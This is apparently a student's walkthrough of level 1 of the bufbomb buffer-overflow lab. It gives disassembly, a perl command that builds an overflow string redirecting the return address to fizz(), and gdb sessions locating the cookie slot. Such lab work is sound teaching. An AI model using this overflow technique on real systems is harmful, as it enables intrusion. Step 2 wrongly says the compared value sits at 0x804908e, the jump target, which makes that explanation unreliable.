Goal = change the return address and but also give your "id" within the buffer overflow.

To find the address of function ```fizz()``` type:
```unix> objdump -d bufbomb | less```

and use ```f``` to go forward and ```b``` to go backwards until you find fizz:

```
0804905f <fizz>:
 804905f:       55                      push   %ebp
 8049060:       89 e5                   mov    %esp,%ebp
 8049062:       83 ec 18                sub    $0x18,%esp
 8049065:       8b 45 08                mov    0x8(%ebp),%eax # <=== 1)
 8049068:       3b 05 e4 c1 04 08       cmp    0x804c1e4,%eax # <=== 2)
 804906e:       75 1e                   jne    804908e <fizz+0x2f> # <=== 3)
 8049070:       89 44 24 04             mov    %eax,0x4(%esp)
 8049074:       c7 04 24 87 9f 04 08    movl   $0x8049f87,(%esp)
 804907b:       e8 60 f8 ff ff          call   80488e0 <printf@plt>
 8049080:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8049087:       e8 48 00 00 00          call   80490d4 <validate>
 804908c:       eb 10                   jmp    804909e <fizz+0x3f>
 804908e:       89 44 24 04             mov    %eax,0x4(%esp)
 8049092:       c7 04 24 80 a1 04 08    movl   $0x804a180,(%esp)
 8049099:       e8 42 f8 ff ff          call   80488e0 <printf@plt>
 804909e:       c7 04 24 00 00 00 00    movl   $0x0,(%esp)
 80490a5:       e8 e6 f8 ff ff          call   8048990 <exit@plt>
```
<b>write down the address of fizz. Mine is 0804905f</b>

1) at 8049065 the value at %esp+8 is being stored into %eax by the mov instruction.
2) the value stored in %eax is compared to the value at address 0x804908e.
   
0x804908e is where the cookie for id "quinnliu" has been stored.

When the comp instruction executes, cmp will set an EFLAG based on the results of the compare.

3) the jne(jump if not equal) instruction jumps to 0x804908e depending the the state of the
EFlag. When the cmp instruction compares 2 values that are equal then the ZF flag = 1 within EFLAGS. 
and the jump will not occur. 

More specific goal = push the address of fizz onto the stack, place the cookie produced by
the id "quinnliu" at the location 0x8(%ebp) 

Now create this new file with the address of fizz you wrote down earlier:
```
unix> perl -e 'print "61 "x32, "5f 90 04 08 ", "BB "x4, "CC "x4 '>hexlevel1
unix> ./hex2raw < hexlevel1 > raw
```

Now type:
```
unix> gdb bufbomb
(gdb) break fizz
(gdb) run -u quinnliu < raw
(gdb) disas
```

Which gives you:
```
(gdb) run -u quinnliu < raw
Starting program: /home/ugrads/majors/quinnliu/Desktop/ComputerOrganizationII/buflab-handout/bufbomb -u quinnliu < raw
Userid: quinnliu
Cookie: 0x2d8cc70c

Breakpoint 1, 0x08049065 in fizz ()
Missing separate debuginfos, use: debuginfo-install glibc-2.12-1.47.el6_2.5.i686
(gdb) disas
Dump of assembler code for function fizz:
   0x0804905f <+0>:     push   %ebp
   0x08049060 <+1>:     mov    %esp,%ebp
   0x08049062 <+3>:     sub    $0x18,%esp
=> 0x08049065 <+6>:     mov    0x8(%ebp),%eax
   0x08049068 <+9>:     cmp    0x804c1e4,%eax
   0x0804906e <+15>:    jne    0x804908e <fizz+47>
   0x08049070 <+17>:    mov    %eax,0x4(%esp)
   0x08049074 <+21>:    movl   $0x8049f87,(%esp)
   0x0804907b <+28>:    call   0x80488e0 <printf@plt>
   0x08049080 <+33>:    movl   $0x1,(%esp)
   0x08049087 <+40>:    call   0x80490d4 <validate>
   0x0804908c <+45>:    jmp    0x804909e <fizz+63>
   0x0804908e <+47>:    mov    %eax,0x4(%esp)
   0x08049092 <+51>:    movl   $0x804a180,(%esp)
   0x08049099 <+58>:    call   0x80488e0 <printf@plt>
   0x0804909e <+63>:    movl   $0x0,(%esp)
   0x080490a5 <+70>:    call   0x8048990 <exit@plt>
End of assembler dump.
```

Now type:
```(gdb) i r``` 

And you will get:

```
(gdb) i r
eax            0x1      1
ecx            0xa      10
edx            0xbe4334 12469044
ebx            0x0      0
esp            0x5568333c       0x5568333c
ebp            0x55683354       0x55683354
esi            0x55686018       1432903704
edi            0xc60    3168
eip            0x8049065        0x8049065 <fizz+6>
eflags         0x216    [ PF AF IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
```

Now we take the address at %ebp and add 0x8 to get the address of where it will grab the value to compare to the cookie "quinnliu"

addressAt%ebp = 0x55683354

addressAt%ebp+8 = 0x55683354 + 8 using the hex calculator from level 0
                = 0x5568335C

Now type:
```(gdb) x/ 0x5568335C```

Gives you:
```
(gdb) x/ 0x5568335C
0x5568335c <_reserved+1037148>: 0x004ae610
```